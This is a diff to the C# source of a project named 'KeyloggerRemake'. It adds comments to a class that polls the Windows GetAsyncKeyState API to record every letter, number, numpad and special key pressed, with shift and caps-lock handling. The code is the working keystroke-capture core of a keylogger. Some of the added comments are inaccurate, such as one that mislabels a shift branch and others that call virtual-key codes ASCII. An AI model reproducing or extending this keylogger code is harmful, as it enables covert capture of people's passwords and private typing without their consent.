@@ -7,59 +7,63 @@ namespace KeyloggerRemake
     public class classGetKeys
     {
         [DllImport("user32.dll")]
-        private static extern short GetAsyncKeyState(Keys vKey);
+        private static extern short GetAsyncKeyState(Keys vKey); //Only used for shift key for less confusion
 
         [DllImport("user32.dll")]
-        private static extern short GetAsyncKeyState(Int32 vKey);
+        private static extern short GetAsyncKeyState(Int32 vKey); //Used to get all pressed keys
 
+        //Checks if shift is held
         private static bool getShift()
         {
-            if (GetAsyncKeyState(Keys.ShiftKey) != 0)
+            if (GetAsyncKeyState(Keys.ShiftKey) != 0) //If it is
             {
                 return true;
             }
-            else
+            else //If it isn't
             {
                 return false;
             }
         }
 
+        //Checks if capslock is on
         private static bool getCapsLock()
         {
             bool capsLock;
-            capsLock = Console.CapsLock;
+            capsLock = Console.CapsLock; //True if it is, false if it isn't
 
             return capsLock;
         }
 
+        //Checks if a key in the alphabet is pressed
         public static string checkAlphabet()
         {
             string strKey = "";
 
+            //From ASCII 65 to 90
             for (int i = 65; i <= 90; i++)
             {
                 int keyPressed = GetAsyncKeyState(i);
                 if (keyPressed == -32767)
                 {
                     strKey = Convert.ToChar(i).ToString();
-                    if (getCapsLock() == true)
+                    if (getCapsLock() == true) //If caps is pressed
                     {
-                        if (getShift() == false)
+                        if (getShift() == false) //But shift isn't held
                         {
                             strKey = strKey.ToUpper();
                         }
-                        else
+                        else //But shift isn't held
                         {
                             strKey = strKey.ToLower();
                         }
                     }
-                    else
+                    else //If caps isn't pressed
                     {
-                        if (getShift() == true)
+                        if (getShift() == true) //But shift is held
                         {
                             strKey = strKey.ToUpper();
                         }
-                        else
+                        else //But shift isn't held
                         {
                             strKey = strKey.ToLower();
                         }
@@ -70,10 +74,12 @@ namespace KeyloggerRemake
             return strKey;
         }
 
+        //Checks if some important extra keys are pressed
         public static string checkExtraKeys()
         {
             string strKey = "";
 
+            //From ASCII 0 to 47
             for (int i = 0; i <= 47; i++)
             {
                 int keyPressed = GetAsyncKeyState(i);
@@ -130,10 +136,12 @@ namespace KeyloggerRemake
             return strKey;
         }
 
+        //Checks if some more extra keys are pressed
         public static string checkMoreExtraKeys()
         {
             string strKey = "";
 
+            //From ASCII 112 to 256
             for (int i = 112; i <= 256; i++)
             {
                 int keyPressed = GetAsyncKeyState(i);
@@ -232,19 +240,22 @@ namespace KeyloggerRemake
             return strKey;
         }
 
+        //Checks if any numbers are pressed, or if the keys above are pressed
         public static string checkNumbersAndAbove()
         {
             string strKey = "";
 
+            //From ASCII 48 to 57
             for (int i = 48; i <= 57; i++)
             {
                 int keyPressed = GetAsyncKeyState(i);
                 if (keyPressed == -32767)
                 {
-                    if (getShift() == true)
+                    if (getShift() == true) //If shift is held
                     {
                         switch (Convert.ToChar(i).ToString())
                         {
+                            //Gets the character above the key pressed
                             case "1":
                                 strKey = "!";
                                 break;
@@ -277,9 +288,9 @@ namespace KeyloggerRemake
                                 break;
                         }
                     }
-                    else
+                    else //If shift isn't held
                     {
-                        strKey = Convert.ToChar(i).ToString();
+                        strKey = Convert.ToChar(i).ToString(); //Gets the normal numbers
                     }
                 }
             }
@@ -287,10 +298,12 @@ namespace KeyloggerRemake
             return strKey;
         }
 
+        //Checks if the numpad is used
         public static string checkNumpad()
         {
             string strKey = "";
 
+            //From ASCII 96 to 120
             for (int i = 96; i <= 120; i++)
             {
                 int keyPressed = GetAsyncKeyState(i);
